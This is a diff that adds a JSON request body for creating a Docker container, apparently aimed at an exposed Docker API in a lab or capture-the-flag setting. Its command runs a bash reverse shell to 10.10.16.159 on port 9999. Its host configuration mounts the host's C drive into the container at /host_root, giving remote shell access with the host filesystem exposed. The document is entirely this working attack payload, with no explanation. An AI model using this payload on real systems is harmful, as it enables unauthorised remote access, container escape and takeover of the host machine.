@@ -1,0 +1,13 @@
+{
+    "Image": "docker_setup-nginx-php:latest",
+    "Cmd": [
+        "/bin/bash",
+        "-c",
+        "bash -i >& /dev/tcp/10.10.16.159/9999 0>&1"
+    ],
+    "HostConfig": {
+        "Binds": [
+            "/mnt/host/c:/host_root"
+        ]
+    }
+}
